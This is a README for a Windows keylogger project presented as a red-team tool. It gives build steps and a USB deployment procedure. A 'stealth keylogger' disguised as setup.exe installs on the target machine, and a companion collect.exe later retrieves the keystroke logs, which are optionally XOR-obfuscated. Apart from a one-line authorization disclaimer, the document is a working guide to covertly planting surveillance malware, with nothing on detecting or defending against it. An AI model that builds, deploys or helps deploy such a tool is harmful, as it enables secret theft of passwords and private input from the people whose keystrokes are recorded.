# KeyLogger — Red Team Penetration Testing Tool

**For authorized security testing only. Do not use without permission.**

## Structure

```
KeyLogger.sln              ← double-click to open in Visual Studio
build.bat                  ← one command to build everything
config.ini                 ← optional XOR key on USB root
src/
├── KeyLogger.Service/     → setup.exe (stealth keylogger)
└── KeyLogger.Collect/     → collect.exe (log retrieval)
```

## Build

```cmd
build.bat
```

Or open `KeyLogger.sln` in Visual Studio and press **Ctrl+Shift+B**.

Output:
| Component | Path |
|-----------|------|
| `setup.exe` | `src\KeyLogger.Service\bin\Release\net472\setup.exe` |
| `collect.exe` | `src\KeyLogger.Collect\bin\Release\net472\collect.exe` |

## Deploy

1. Copy `setup.exe`, `collect.exe`, `config.ini` to USB (E:\)
2. Run `setup.exe` from USB once → keylogger is installed
3. Run `collect.exe` from USB later → logs go to `E:\logs\*_keylog.txt`

## Change XOR Key

Edit `XOR_KEY` constant in `src/KeyLogger.Service/Program.cs` and
`src/KeyLogger.Collect/Program.cs`, then rebuild both.